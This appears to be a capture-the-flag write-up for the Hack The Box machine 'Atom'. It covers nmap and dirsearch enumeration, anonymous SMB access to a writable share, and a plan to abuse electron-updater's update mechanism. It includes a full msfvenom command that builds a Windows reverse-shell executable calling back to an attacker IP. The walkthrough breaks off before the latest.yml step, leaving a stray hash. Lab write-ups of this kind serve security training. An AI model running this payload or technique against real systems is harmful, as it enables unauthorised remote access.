
![Image Atom]()


## ------------->> Atom <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.237 -p-
-------

    Nmap scan report for 10.10.10.237
    Host is up (0.17s latency).
    Not shown: 65529 filtered tcp ports (no-response)
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
    |_http-title: Heed Solutions
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
    135/tcp  open  msrpc      Microsoft Windows RPC
    443/tcp  open  ssl/http   Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Heed Solutions
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    6379/tcp open  redis      Redis key-value store
    7680/tcp open  tcpwrapped
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Navigating to http://10.10.10.237/ present us with software product website

![Image 1]()

// Lets search for interesting directories or files with [dirsearch]()(By ).

    $ python3 dirsearch.py -u http://10.10.10.237/ -t 100
-------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.237/_21-09-10_17-04-26.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-10_17-04-26.log

    Target: http://10.10.10.237/

    ...
    [17:04:35] 403 -  302B  - /Trace.axd::$DATA
    [17:04:41] 403 -  302B  - /cgi-bin/
    [17:04:41] 500 -  636B  - /cgi-bin/printenv.pl
    [17:04:45] 301 -  338B  - /images  ->  http://10.10.10.237/images/
    [17:04:45] 200 -  984B  - /images/
    [17:04:45] 200 -    7KB - /index.html
    [17:04:46] 503 -  402B  - /examples/servlets/servlet/CookieExample
    [17:04:46] 503 -  402B  - /examples/servlets/index.html
    [17:04:46] 503 -  402B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
    [17:04:46] 503 -  402B  - /examples/jsp/snp/snoop.jsp
    [17:04:46] 503 -  402B  - /examples
    [17:04:46] 503 -  402B  - /examples/servlets/servlet/RequestHeaderExample
    [17:04:46] 503 -  402B  - /examples/
    [17:04:46] 503 -  402B  - /examples/servlet/SnoopServlet
    [17:04:48] 403 -  302B  - /phpmyadmin/docs/html/index.html
    [17:04:48] 403 -  302B  - /phpmyadmin/ChangeLog
    [17:04:48] 403 -  302B  - /phpmyadmin/doc/html/index.html
    [17:04:48] 403 -  302B  - /phpmyadmin/README
    [17:04:48] 403 -  302B  - /phpmyadmin
    [17:04:48] 403 -  302B  - /phpmyadmin/index.php
    [17:04:49] 403 -  302B  - /phpmyadmin/phpmyadmin/index.php
    [17:04:49] 403 -  302B  - /phpmyadmin/
    [17:04:49] 403 -  302B  - /phpmyadmin/scripts/setup.php
    [17:04:50] 301 -  340B  - /releases  ->  http://10.10.10.237/releases/
    [17:04:50] 403 -  421B  - /server-status/
    [17:04:50] 403 -  421B  - /server-status
    [17:04:50] 403 -  421B  - /server-info
    [17:04:53] 403 -  302B  - /web.config::$DATA
    [17:04:53] 403 -  302B  - /webalizer

    Task Completed

// Nothing we can further go with... Move on!

// Earlier with nmap we can see there SMB service open

// Lets check if it allows anonymous connection with smbmap

    $ smbmap -u anonymous -H 10.10.10.237
------
    
    [+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      ADMIN$                                            	NO ACCESS	Remote Admin
      C$                                                	NO ACCESS	Default share
      IPC$                                              	READ ONLY	Remote IPC
      Software_Updates                                  	READ, WRITE	

// It worked !, We can see that we have permission(READ, WRITE) only in directory Software_Updates

// Lets check him out

    $ smbmap -u anonymous -r Software_Updates -H 10.10.10.237
------

    [+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
            Disk                                                  	Permissions	Comment
      ----                                                  	-----------	-------
      Software_Updates                                  	READ, WRITE	
      .\Software_Updates\*
      dr--r--r--                0 Fri Sep 10 18:53:53 2021	.
      dr--r--r--                0 Fri Sep 10 18:53:53 2021	..
      dr--r--r--                0 Fri Sep 10 18:49:49 2021	client1
      dr--r--r--                0 Fri Sep 10 18:49:49 2021	client2
      dr--r--r--                0 Fri Sep 10 18:49:49 2021	client3
      fr--r--r--            35202 Fri Apr  9 07:18:08 2021	UAT_Testing_Procedures.pdf

// after checking client1,2,3 are empty so i downloaded 'UAT_Testing_Procedures.pdf' to see his content

    $ smbmap -u anonymous --download 'Software_Updates\UAT_Testing_Procedures.pdf' -H 10.10.10.237

![Image 2]()

// We can see that the pdf mantion electron-builder and that should be update-server

// After some digging [Electron builder](https://github.com/electron-userland/electron-builder) is:

    A complete solution to package and build a ready for distribution Electron, Proton Native app for macOS,
    Windows and Linux with “auto update” support out of the box.

// Digging some more found a vulnerability at electron-updater [here](https://snyk.io/test/npm/electron-updater/1.4.0)

![Image 3]()

// So lets try this, first we need to make .exe reverse shell, we will use msfvenom for that

    $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.6 LPORT=1444 -f exe > rshell.exe
------

    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder specified, outputting raw payload
    Payload size: 324 bytes
    Final size of exe file: 73802 bytes

// Now we can make our 'latest.yml' file



f486053b0ed2b8e4d46b3c056b9f8dcdb9bb5d7f7f51ed03ae2a90d307e3fcdb2da28233e27527637fe8ab1c85e1c81f2894c92953894a2f94262d557da62b65

// The website offer us to download an .exe that demonstrate their notes software

